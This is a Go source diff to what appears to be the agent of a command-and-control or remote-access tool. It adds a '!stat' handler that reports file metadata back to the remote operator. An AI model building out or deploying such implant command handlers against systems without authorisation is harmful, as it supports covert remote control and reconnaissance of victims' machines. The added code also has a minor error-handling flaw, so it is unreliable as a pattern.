@@ -3,6 +3,7 @@ package agent
 import (
 	"context"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -143,6 +144,26 @@ func processCCData(data *MsgTunData) {
 			}
 
 			out = "current working directory: " + pwd
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// stat file
+		if cmdSlice[0] == "!stat" {
+			if len(cmdSlice) < 2 {
+				return
+			}
+
+			fi, err := os.Stat(cmdSlice[1])
+			if err != nil {
+				out = fmt.Sprintf("cant stat file %s: %v", cmdSlice[1], err)
+			}
+			fiData, err := json.Marshal(fi)
+			out = string(fiData)
+			if err != nil {
+				out = fmt.Sprintf("cant marshal file info %s: %v", cmdSlice[1], err)
+			}
+
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
 		}
